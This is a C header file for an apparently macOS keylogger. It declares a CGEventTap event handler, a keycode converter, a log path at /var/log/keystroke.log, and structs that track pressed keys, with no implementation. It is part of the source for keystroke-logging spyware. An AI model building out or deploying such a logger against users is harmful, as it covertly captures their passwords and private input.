#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__
/******************************************************/
#define MY_LOG_LEVEL    LOG_TRACE
/******************************************************/
#include "../include/includes.h"
/******************************************************/
FILE *logfile = NULL;
unsigned long       last_ts;
struct StringBuffer *sb;
/******************************************************/
const char          *logfileLocation = "/var/log/keystroke.log";
CGEventRef          event_handler(CGEventTapProxy, CGEventType, CGEventRef, void *);
const char *convertKeyCode(int);

/******************************************************/
/******************************************************/
typedef struct KeyState {
  unsigned long ts;
  char          *name;
  int           code;
  struct list_t *downkeys;
};
struct KeyState *keystate;
typedef struct DownKey {
  int           keycode;
  unsigned long ts;
};
struct DownKeys *downkey;
#endif

